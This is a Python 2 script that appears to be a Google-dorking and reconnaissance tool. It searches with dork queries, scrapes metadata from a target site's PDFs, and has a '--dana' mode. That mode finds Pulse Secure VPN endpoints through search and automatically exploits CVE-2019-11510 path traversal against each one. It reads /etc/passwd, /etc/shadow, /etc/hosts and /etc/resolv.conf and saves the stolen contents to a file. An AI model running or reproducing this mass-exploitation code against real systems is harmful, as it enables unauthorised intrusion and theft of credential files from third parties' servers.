#! /usr/bin/env python2
# -*- coding: utf-8 -*-
from googlesearch import search
import argparse
from terminal_text_color import TextColor
from time import sleep
from PyPDF2 import PdfFileReader
import requests
import os
import urllib2



'''
Be sure to have the python 2 pip installed

pip install google
pip install terminal_text_color
pip install pypdf2
pip install urllib
'''

tc = TextColor()
descr = tc.opaque_yellow('''

In construction.
''')

parser = argparse.ArgumentParser(description=descr)
parser.add_argument('-d', action="store", dest="dict", help="File to use (dict)", default="Enter file here please")
parser.add_argument('-o', action="store", dest="othr", help="Other extra parameter", default="")
parser.add_argument('-u', action="store", dest="url_s", help="site to probe like google.com, no http or https", default="")
parser.add_argument('-e', action="store", dest="url_exc", help="exclude site, like www.facebook.com or probas.facebook.com", default="")
parser.add_argument('-A', action="store", dest="user_agentt", help="User agent, default: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36", default="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36")
parser.add_argument('-n', action="store", dest="results_n", help="Max number of resultes, default: 20", default="20")
parser.add_argument('-v', action="store_true", dest="verbose", help="verbose", default="")
parser.add_argument('-w', action="store", dest="Write_File", help="Write the results in a cool file.", default="")
parser.add_argument('--meta', action="store_true", dest="meta", help="Select a url and search for metadata files. Only accept -u, -v, -e", default="")
parser.add_argument('--dana', action="store_true", dest="dana", help="fun with CVE-2019-11510, use -u parameter to search for specific urls, or extensions. -u .es serach only in .es -n for number of results", default="")
result = parser.parse_args()

if result.Write_File != "":
	f = open(result.Write_File, "wb")
	f.close()

def peti(petition):
	if result.verbose:
		print tc.bold_red("Searching for:  --- " + petition + " ---")
	aleluya = search(petition, stop=int(result.results_n), user_agent=result.user_agentt, pause=50.0)
	for urlis in aleluya:
		print(tc.bold_yellow(urlis))
		if result.Write_File != "":
			f = open(result.Write_File, "a+")
			f.write(urlis + "\n")
			f.close()

	aleluya.close()

def meta_pdf(url_pdf):
	try:
		path = "./%s/%s" % (result.url_s, url_pdf.split("/")[-1])
		headers = {'user-agent': result.user_agentt}
		print tc.bold_yellow("Download: %s" % url_pdf)
		r = requests.get(url_pdf, headers=headers)
		with open(path, 'wb') as f:  
			f.write(r.content)
	except:
		print "%s Can't Download or search for metadata" % url_pdf
	try:
		print tc.bold_yellow("File %s metadata:" % path)
		fl = open("./%s/metadata_results.txt" % result.url_s, "a+")
		fl.write("---Url: %s --- \n" % url_pdf)
		fl.write("--------> File %s metadata: <------------ \n" % path)
		fp = open(path, 'rb')
		pdf = PdfFileReader(fp)
		if pdf.isEncrypted:
			pdf.decrypt('')
		info = pdf.getDocumentInfo()
		for i in info:
			print tc.italic_yellow(i + ": " + info[i])
			fl_write_line = "    " + i + ": " + info[i] + "\n"
			fl.write(fl_write_line.encode('utf8'))
		fl.close()
		fp.close()
	except:
		print tc.bold_red("Can't read metadata in: %s" % path)


def meta():
	lines = ["pdf"]
	try:
		os.mkdir("./%s" % result.url_s)
		fl = open("./%s/metadata_results.txt" % result.url_s, "wb")
		fl.close()
	except:
		print tc.bold_red("Can't create %s folder or metadata_results file, check permision or if already exist" % result.url_s)
		exit()
	if result.url_s == "":
		print "Need use a -u parameter to select a target, bro/sys"
		exit()
	urlp = "site:%s" % result.url_s

	for i in lines:
		if result.url_exc == "":
			url_excp = ""
		else:
			url_excp = "-site:%s" % result.url_exc
		petition = "%s + filetype:%s %s " %(urlp, i, url_excp)
		print tc.bold_red(petition)
		aleluya = search(petition, stop=int(result.results_n), user_agent=result.user_agentt, pause=50.0)
		for urlis in aleluya:
			if i == "pdf":
				meta_pdf(urlis)
#				print(tc.bold_yellow(urlis))
	print "View results in ./%s/metadata_results.txt file" % result.url_s
	



def searching(url_s, dict, url_exc, othr):
	if url_exc == "":
		url_excp = ""
	else:
		url_excp = "-site:%s" % url_exc
	if url_s == "":
		urlp = ""
	else:
		urlp = "site:%s" % url_s

	if dict == "Enter file here please":
		lines = othr
		petition = "%s %s + %s" %(urlp, url_excp, othr)
		peti(petition)
	else:
		f = open(result.dict, "rb")
		lines = f.readlines()
		f.close()
		for i in lines:
			petition = "%s + %s %s %s" %(urlp, i.split("\n")[0], url_excp, othr)
			peti(petition)


def dana():
	print "All vulnerable sites save in dana_gift.txt"
	dork_dana = "inurl:/dana-na/ filetype:cgi"
	files_search = ['/etc/resolv.conf', '/etc/shadow', '/etc/hosts']
	if result.url_s != "":
		result.url_s = "site:" + result.url_s
	petition = "inurl:/dana-na/ filetype:cgi %s" % result.url_s 
	print petition
	aleluya = search(petition, stop=int(result.results_n), user_agent=result.user_agentt, pause=50.0)
	dana_gift = open("dana_gift.txt", "wb")
	dana_vulnerbles = open("dana_vulnerbles.txt", "wb")
	for urlis in aleluya:
		print(tc.bold_yellow(urlis))
		print "Try that Shit:"
		try:
			urlis_f = urlis.split("/dana-na/")[0]
			aa = "%s/dana-na/../dana/html5acc/guacamole/../../../../../../..%s?/dana/html5acc/guacamole/" % (urlis_f, "/etc/passwd")
			print aa
			aaa = urllib2.urlopen(aa).read()
			if "Wrong URL." not in aaa:
				print tc.italic_yellow("Shit it's vulnerable!!")
				dana_gift.write("-----------------------\n")
				dana_gift.write(urlis_f + "\n")
				dana_gift.write("-----------------------\n")
				dana_gift.write(aaa + "\n")
				dana_vulnerbles.write(urlis_f + "\n")
				print aaa
				for i in files_search:
					print tc.italic_yellow("Search for: %s" % i)
					aa = "%s/dana-na/../dana/html5acc/guacamole/../../../../../../..%s?/dana/html5acc/guacamole/" % (urlis_f, i)
					try:
						aaa2 = urllib2.urlopen(aa).read()
						print aaa2
						dana_gift.write(aaa2 + "\n")
					except:
						print tc.bold_red("4fck4 not found")
			else:
				print tc.bold_red("Oh fck, it's no vulnerable :(")
		except:
			print tc.bold_red("Oh fck, it's no vulnerable :(")
	dana_gift.close()
	dana_vulnerbles.close()
if result.meta:
	meta()
elif result.dana:
	dana()
else:
	searching(result.url_s, result.dict, result.url_exc, result.othr)
